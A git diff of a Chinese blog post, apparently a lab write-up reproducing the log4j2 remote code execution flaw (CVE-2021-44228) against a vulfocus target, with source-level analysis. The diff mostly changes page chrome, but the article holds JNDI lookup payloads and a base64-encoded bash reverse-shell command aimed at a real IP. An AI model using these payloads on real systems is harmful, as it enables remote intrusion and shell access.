@@ -13,10 +13,20 @@ Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷�
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>log4j2远程命令执行漏洞复现（CVE-2021-44228） | hybcx&#39;s blog</title>
@@ -262,7 +272,7 @@ Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷�
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -319,7 +329,7 @@ Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷�
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -418,11 +428,6 @@ Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷�
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -439,13 +444,13 @@ Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷�
                 <h1>Apache log4j2 远程命令执行漏洞复现</h1>
 <h2 id="0x01-前言">0x01 前言</h2>
 <p>Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷纷中招，与之前的fastjson、shiro漏洞相比更为严重，预计在之后的三四年中漏洞会一直存在。此漏洞影响范围特别广泛，漏洞利用门槛低，危害程度非常大，如果被攻击者恶意利用，危害程度不亚于2017年爆发的“永恒之蓝”漏洞。以下图片来源于网络</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172039913.png" alt="image-20230729172039913"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172049681.png" alt="image-20230729172049681"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172110266.png" alt="image-20230729172110266"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172128853.png" alt="image-20230729172128853"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172141515.png" alt="image-20230729172141515"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172150957.png" alt="image-20230729172150957"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172158959.png" alt="image-20230729172158959"></p>
+<p><img src="image-20230729172039913.png" alt="image-20230729172039913"></p>
+<p><img src="image-20230729172049681.png" alt="image-20230729172049681"></p>
+<p><img src="image-20230729172110266.png" alt="image-20230729172110266"></p>
+<p><img src="image-20230729172128853.png" alt="image-20230729172128853"></p>
+<p><img src="image-20230729172141515.png" alt="image-20230729172141515"></p>
+<p><img src="image-20230729172150957.png" alt="image-20230729172150957"></p>
+<p><img src="image-20230729172158959.png" alt="image-20230729172158959"></p>
 <h2 id="0x02-漏洞简介">0x02 漏洞简介</h2>
 <p>Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
 <ul>
@@ -533,7 +538,7 @@ Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷�
 </blockquote>
 <h2 id="0x04-漏洞演示">0x04 漏洞演示</h2>
 <p>演示靶场采用<a target="_blank" rel="noopener" href="http://vulfocus.fofa.so/">vulfocus</a>在线平台的log4j2-rce靶场，该靶场漏洞位置存在于/hello路径</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172431747.png" alt="image-20230729172431747"></p>
+<p><img src="image-20230729172431747.png" alt="image-20230729172431747"></p>
 <p>vulfocus的log4j2-rce靶场的请求数据包如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">GET /hello?payload=111 HTTP/1.1
 Host: vulfocus.fofa.so:30861
@@ -546,11 +551,11 @@ jdk8：https://www.wmzhe.com/soft-70159.html<span aria-hidden="true" class="line
 <h2 id="0x05-漏洞检测">0x05 漏洞检测</h2>
 <h3 id="1-dnslog手动验证">1. dnslog手动验证</h3>
 <p>首先在dnslog平台生成一个地址，然后利用该地址构造payload让靶机对dnslog平台发起请求：</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729172720414.png" alt="image-20230729172720414"></p>
+<p><img src="image-20230729172720414.png" alt="image-20230729172720414"></p>
 <p>传入payload：<code>payload=%24%7Bjndi%3Aldap%3A%2F%2Fauks48.dnslog.cn%7D</code> --记得url编码</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729180526568.png" alt="image-20230729180526568"></p>
+<p><img src="image-20230729180526568.png" alt="image-20230729180526568"></p>
 <p>请求成功后，dnslog平台点击 <code>Refresh Record</code> 后会接收靶机的请求，记录了靶机的请求的ip地址以及响应时间</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729180546590.png" alt="image-20230729180546590"></p>
+<p><img src="image-20230729180546590.png" alt="image-20230729180546590"></p>
 <p>通过上述步骤验证，在演示靶场环境中可以确定漏洞是真实存在的，但在真实环境中只能说初步判断目标是有大概率存在漏洞的，由于真实环境中的一些复杂因素，即使dnslog请求成功了也不能完全保证目标一定存在rce漏洞。</p>
 <h3 id="2-漏洞利用">2.  漏洞利用</h3>
 <h4 id="1-JNDIExploit">1. JNDIExploit</h4>
@@ -673,15 +678,15 @@ WebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 
 <p>将反弹shell指令base64编码后，将一整串启动JNDI代码在vps中运行</p>
 <p>这里使用</p>
 <pre class="line-numbers language-none"><code class="language-none">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}"  -A 124.220.233.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182154989.png" alt="image-20230729182154989"></p>
+<p><img src="image-20230729182154989.png" alt="image-20230729182154989"></p>
 <p>使用burpsuit抓包，替换payload</p>
 <pre class="line-numbers language-none"><code class="language-none">rmi://124.220.233.26:1099/29h4wg
 
 ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182440231.png" alt="image-20230729182440231"></p>
+<p><img src="image-20230729182440231.png" alt="image-20230729182440231"></p>
 <p>成功反弹shell</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182428974.png" alt="image-20230729182428974"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182523042.png" alt="image-20230729182523042"></p>
+<p><img src="image-20230729182428974.png" alt="image-20230729182428974"></p>
+<p><img src="image-20230729182523042.png" alt="image-20230729182523042"></p>
 <p>找到flag</p>
 <h2 id="0x06-Log4j2源码浅析">0x06 Log4j2源码浅析</h2>
 <blockquote>
@@ -696,7 +701,7 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731180203568.png" alt="image-20230731180203568"></p>
+<p><img src="image-20230731180203568.png" alt="image-20230731180203568"></p>
 <p>在工程目录resources下创建log4j2.xml</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
 
@@ -730,31 +735,31 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token comment">//在 main 方法中，定义了一个字符串变量 a 并赋值为 "${java:os}"。然后，使用 logger 的 error() 方法将字符串 a 记录为错误日志。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731180802075.png" alt="image-20230731180802075"></p>
+<p><img src="image-20230731180802075.png" alt="image-20230731180802075"></p>
 <blockquote>
 <p>属性占位符之Interpolator插值器</p>
 </blockquote>
 <p>log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:<code>${prefix:key}</code>。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731181824461-1690798705020-1.png" alt="image-20230731181824461"></p>
+<p><img src="image-20230731181824461-1690798705020-1.png" alt="image-20230731181824461"></p>
 <p>详细信息可以查看<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">官方文档</a>。这些实现类存在于<code>org.apache.logging.log4j.core.lookup</code>包下。</p>
 <p>当参数占位符<code>${prefix:key}</code>带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符<code>${key}</code>没有prefix时，Interpolator则会从默认查找器中进行查询。如使用<code>${jndi:key}</code>时，将会调用<code>JndiLookup</code>的<code>lookup方法</code> 使用jndi(javax.naming)获取value。如下图演示。</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731181943132.png" alt="image-20230731181943132"></p>
+<p><img src="image-20230731181943132.png" alt="image-20230731181943132"></p>
 <blockquote>
 <p>模式布局</p>
 </blockquote>
 <p>log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有<code>PatternLayout</code>，也就是我们在配置文件中<code>PatternLayout</code>字段所指定的属性<code>pattern</code>的值<code>%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n</code>。 <code>%msg</code>表示所输出的消息，其它格式化字符所表示的意义可以查看<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/layouts.html">官方文档</a>。</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731182115294.png" alt="image-20230731182115294"></p>
+<p><img src="image-20230731182115294.png" alt="image-20230731182115294"></p>
 <p><code>PatternLayout</code>模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表。在配置文件<code>PatternLayout</code>标签的<code>pattern</code>属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过<code>PluginManager</code>收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。相关转换器名称注解和加载的插件实例如下图所示：</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731182558351.png" alt="image-20230731182558351"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731182603989.png" alt="image-20230731182603989"></p>
+<p><img src="image-20230731182558351.png" alt="image-20230731182558351"></p>
+<p><img src="image-20230731182603989.png" alt="image-20230731182603989"></p>
 <p>本次漏洞关键在于转换器名称<code>msg</code>对应的插件实例为<code>MessagePatternConverter</code>对于日志中的消息内容处理存在问题，这部分是攻击者可控的。<code>MessagePatternConverter</code>会将日志中的消息内容为<code>${prefix:key}</code>格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。</p>
 <blockquote>
 <p>日志级别</p>
 </blockquote>
 <p>log4j2支持种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：<code>fatal(致命的), error, warn, info, debug, trace(堆栈)。</code> log4j2还定义了一个内置的标准级别<code>intLevel</code>，由数值表示，级别越高数值越小。</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731183144121.png" alt="image-20230731183144121"></p>
+<p><img src="image-20230731183144121.png" alt="image-20230731183144121"></p>
 <p>当日志级别（调用）大于等于系统设置的<code>intLevel</code>的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中<code>&lt;root level="error"&gt;</code>值设置<code>intLevel</code>。当然我们也可以通过<code>Configurator.setLevel("当前类名", Level.INFO);</code>来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理：</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729627000-1639496128233-image.png" alt="img"></p>
+<p><img src="1639729627000-1639496128233-image.png" alt="img"></p>
 <h2 id="0x07-漏洞原理">0x07 漏洞原理</h2>
 <p>首先先来看一下网络上流传最多的payload</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">{</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">2l</span>nhn2<span class="token punctuation">.</span>ceye<span class="token punctuation">.</span>io<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -775,12 +780,12 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>直击漏洞本源，将断点断在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>方法上，该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法。log4j2默认布局使用的是PatternLayout，如下图所示：</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731184102645.png" alt="image-20230731184102645"></p>
+<p><img src="image-20230731184102645.png" alt="image-20230731184102645"></p>
 <p>继续跟进在encode中会调用toText方法，根据注释，该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639556483235-image.png" alt="img"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639556642631-image.png" alt="img"></p>
+<p><img src="1639729628000-1639556483235-image.png" alt="img"></p>
+<p><img src="1639729628000-1639556642631-image.png" alt="img"></p>
 <p>接下来会调用<code>serializer.toSerializable</code>，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639557107920-1.png" alt="img"></p>
+<p><img src="1639729628000-1639557107920-1.png" alt="img"></p>
 <p>这里整理了一下调用的Converter</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>DatePatternConverter</span>
 <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>LiteralPatternConverter</span>
@@ -791,31 +796,31 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
 <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>LineSeparatorPatternConverter</span>
 <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>ExtendedThrowablePatternConverter</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639557401374-2.png" alt="img"></p>
+<p><img src="1639729628000-1639557401374-2.png" alt="img"></p>
 <p>在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符"{"，这三行代码中关键点在于最后一行</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639557496795-3.png" alt="img"></p>
+<p><img src="1639729629000-1639557496795-3.png" alt="img"></p>
 <p>这里我圈了几个重点，有助于理解Log4j2 为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示</p>
 <pre class="line-numbers language-none"><code class="language-none">09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是<code>$</code>符号，也就是说<code>${jndi:ldap://2lnhn2.ceye.io}</code>这段不要了，从第53位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是<code>${jndi:ldap://2lnhn2.ceye.io}</code>这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639557906309-4.png" alt="img"></p>
+<p><img src="1639729629000-1639557906309-4.png" alt="img"></p>
 <p>经过一段的嵌套调用，来到<code>Interpolator.lookup</code>，这里会通过<code>var.indexOf(PREFIX_SEPARATOR)</code>判断":"之前的字符，我们这里用的是jndi然后，就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558050853-5.png" alt="img"></p>
+<p><img src="1639729629000-1639558050853-5.png" alt="img"></p>
 <p>那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558068698-6.png" alt="img"></p>
+<p><img src="1639729629000-1639558068698-6.png" alt="img"></p>
 <p>然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558181829-7.png" alt="img"></p>
+<p><img src="1639729629000-1639558181829-7.png" alt="img"></p>
 <p>说到这里，我们已经详细了解了logger.error()造成RCE的原理：</p>
 <pre class="line-numbers language-none"><code class="language-none">前提是`MessagePatternConverter`会将日志中的消息内容为`${prefix:key}`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。
 而在上述的跟踪过程之后我们发现成功调用了jndilookup方法，最终达成了RCE。
 而偏偏是jndi引起漏洞的原因为：
 	在 Apache Log4j 2.x 的早期版本中，存在一个不安全的默认配置，允许解析 ${java:...} 形式的 JNDI 变量。这是因为 Log4j 2.x 支持使用各种各样的变量来动态地引用配置文件中的值，包括系统属性、环境变量、JNDI 变量等。然而，JNDI 变量的处理在这个过程中被滥用，导致了漏洞的出现。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值<code>intLevel</code>记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示：</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558210204-8.png" alt="img"></p>
+<p><img src="1639729629000-1639558210204-8.png" alt="img"></p>
 <p>当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558233235-9.png" alt="img"></p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729630000-1639558237360-10.png" alt="img"></p>
+<p><img src="1639729629000-1639558233235-9.png" alt="img"></p>
+<p><img src="1639729630000-1639558237360-10.png" alt="img"></p>
 <p>跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示</p>
-<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729630000-1639558245631-11.png" alt="img"></p>
+<p><img src="1639729630000-1639558245631-11.png" alt="img"></p>
 <p>而这里日志优先级数值小于等于200的就只有"error"、“fatal”，这两个，所以logger.fatal()方法也可触发漏洞。但是"warn"、"info"等大于200的就触发不了了。</p>
 <p>但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
@@ -969,7 +974,7 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -977,7 +982,7 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -1257,12 +1262,12 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1391,6 +1396,8 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1418,8 +1425,8 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1502,8 +1509,6 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1523,24 +1528,28 @@ ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="tru
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1752,8 +1761,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
